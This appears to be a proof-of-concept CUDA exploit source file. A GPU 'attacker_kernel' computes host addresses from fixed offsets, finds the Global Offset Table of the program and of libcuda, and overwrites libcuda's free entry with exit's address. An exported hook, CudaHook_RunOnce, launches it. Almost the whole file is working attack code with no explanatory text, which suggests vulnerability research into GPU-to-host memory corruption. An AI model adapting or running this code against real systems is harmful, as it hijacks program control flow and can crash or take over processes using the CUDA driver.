#include <stdio.h>
#include <cuda_runtime.h>
#include <unistd.h>

__global__ void attacker_kernel(int *input) {
	size_t *got_prober = (size_t*)(((size_t)((size_t) input >> 32) - 4) << 32 | 0x144518); 
	printf("GOT prober address: %p\n", got_prober);
	size_t *got_address = (size_t*)(*got_prober + 0x9a9268); //GOT base offset
	printf("GOT base address: %p\n", got_address);
	size_t *ioctl_GOT = got_address + 0x0700 / sizeof(size_t); //ioctl GOT entry
	size_t *free_GOT  = got_address - 0x6738 / sizeof(size_t); //free GOT entry
	size_t *exit_GOT  = got_address + 0x02f8 / sizeof(size_t); //exit GOT entry

	printf("ioctl_GOT: %p\n", ioctl_GOT);
	printf("free_GOT: %p\n", free_GOT);
	printf("exit_GOT: %p\n", exit_GOT);

	size_t *ioctl_addr = (size_t*)(*ioctl_GOT);
	size_t *free_addr = (size_t*)(*free_GOT);	
	size_t *exit_addr = (size_t*)(*exit_GOT);

	size_t *libcuda_prober = (size_t*)(((size_t)((size_t) input >> 32) - 4) << 32);
	libcuda_prober = (size_t *)((size_t)(libcuda_prober) + 0x40004cc20);
	printf("libcuda prober address: %p\n", libcuda_prober);
	size_t *libcuda_base = (size_t*)(*libcuda_prober);
	printf("libcuda base address: %p\n", libcuda_base);

	size_t *libcuda_GOT = (size_t*)((size_t)libcuda_base + 0x436c000);
	printf("libcuda_GOT: %p\n", libcuda_GOT);


	size_t *libcuda_free_GOT = libcuda_GOT;
	for(int i = 0; i < 0x1000; ++i) {
		if(*libcuda_free_GOT == (size_t)free_addr) {
			printf("Found free in libcuda GOT at: %p\n", libcuda_free_GOT);
			break;
		}
		libcuda_free_GOT = libcuda_free_GOT + 1;
	}

	printf("libcuda free GOT: %p\n", libcuda_free_GOT);

	printf("Overwriting free GOT entry...\n");
	*libcuda_free_GOT = (size_t)exit_addr;

}


void kernel_launcher(int *user_input) {
	int *input = (int *)malloc(1024);
	for(int i = 0; i < 1024/sizeof(int); i++) {
		input[i] = user_input[i];
	}

	attacker_kernel<<<1, 1>>>(input);
	cudaDeviceSynchronize();
	printf("Attacker kernel finished.\n");
}



extern "C" void CudaHook_RunOnce(int *input) {
	printf("Running attacker kernel...\n");
	kernel_launcher(input);
}
